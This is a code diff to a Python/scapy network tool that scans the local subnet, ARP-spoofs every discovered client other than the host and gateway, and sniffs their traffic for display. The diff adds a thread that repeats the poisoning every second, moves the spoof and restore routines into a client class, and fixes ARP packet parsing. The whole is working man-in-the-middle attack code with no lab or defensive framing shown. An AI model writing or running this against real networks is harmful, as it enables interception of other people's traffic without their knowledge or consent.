@@ -122,7 +122,7 @@ class IPv4_packet(Ethernet_frame):
 class ARP_packet(Ethernet_frame):
     def __init__(self, data):
         Ethernet_frame.__init__(self, data)
-        self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation, self.b_SHA, self.b_SPA, self.b_THA, self.b_TPA = struct.unpack('! H H B B H s[6] s[4] s[6] s[4]', self.data)
+        self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation, self.b_SHA, self.b_SPA, self.b_THA, self.b_TPA = struct.unpack('! H H B B H 6s 4s 6s 4s', self.data)
         self.SHA, self.SPA, self.THA, self.TPA = get_mac_adress(self.b_SHA), ipv4(self.b_SPA), get_mac_adress(self.b_THA), ipv4(self.b_TPA)
         self.type = 'ARP_packet'
     def print_values(self):
@@ -219,17 +219,9 @@ def factory(data):
                 obj = HTTP(data)
         elif (obj.proto == 6):
             obj = UDP(data)
-    elif (obj.eth_proto == b'\x08\x06'):
+    elif (obj.eth_proto == 1544 and len(obj.data) == 28):
         obj = ARP_packet(data)
     return obj
-
-def spoof(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac), verbose=False)
-    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac), verbose=False)
-
-def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7, verbose=False)
-    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7, verbose=False)
 
 def get_mac(ip):
     arp_request = ARP(pdst=ip)
@@ -274,6 +266,18 @@ class Client():
         self.mac = mac
         self.type = (self.ip == host_ip or self.ip == gateway_ip)
         self.packets = []
+        self.arp_packets = 0
+    def spoof(self):
+        send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac), verbose=False)
+        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=self.mac), verbose=False)
+    def restore(self):
+        send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = gateway_mac), verbose=False)
+        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc=self.mac), verbose=False)
+    def fire(self):
+        try:
+            self.spoof()
+        except:
+            self.restore()
 
 
 class IPtable():
@@ -300,11 +304,6 @@ class IPtable():
         if (self.find(client) == -1):
             self.clients.append(client)
 
-    def drop(self, client):
-        if (self.find(client) != -1):
-            self.clients.append(client)
-            restore(client.ip, client.mac, self.gateway_ip, self.mac)
-
     def scan(self):
         ips = []
         for network, netmask, _, interface, address, _ in scapy.config.conf.route.routes:
@@ -329,36 +328,44 @@ class IPtable():
     def attack(self):
         for client in self.clients:
             if (client.type == False):
-                spoof(client.ip, client.mac, self.gateway_ip, self.gateway_mac)
+                client.fire()
 
     def restore(self):
         for client in self.clients:
             if (client.type == False):
-                restore(client.ip, client.mac, self.gateway_ip, self.mac)
+                client.restore()
 
     def insert_packet(self, packet):
         client_id = self.find_mac(packet.dest_mac)
         if (client_id != -1):
-            self.clients[client_id].packets.append(packet)
+            if (packet.type == 'ARP_packet'):
+                self.clients[client_id].arp_packets += 1
+            else:
+                self.clients[client_id].packets.append(packet)
 
 
-def main(Ips):
-    Ips.scan()
-    Ips.attack()
+def sniff(Ips):
     while (True):
         raw_data, address = conn.recvfrom(65535)
         Seg = factory(raw_data)
         Ips.insert_packet(Seg)
 
+def attack(Ips):
+    while (True):
+        Ips.attack()
+        time.sleep(1)
 
 
 if __name__ == '__main__':
     conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
     gateway_mac = get_mac(gateway_ip)
     Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
+    Ips.scan()
     #main(Ips)
-    th = threading.Thread(target=main, args=(Ips, ), daemon=True)
-    th.start()
+    th_sniff = threading.Thread(target=sniff, args=(Ips, ), daemon=True)
+    th_sniff.start()
+    th_attack = threading.Thread(target=attack, args=(Ips,), daemon=True)
+    th_attack.start()
     command = ''
     while (command != 'exit'):
         command = input('input command: ')
@@ -380,5 +387,6 @@ if __name__ == '__main__':
             a = int(a) - 1
             for i in Ips.clients[a].packets:
                 i.print_values()
+                #print(i.data)
 
     Ips.restore()
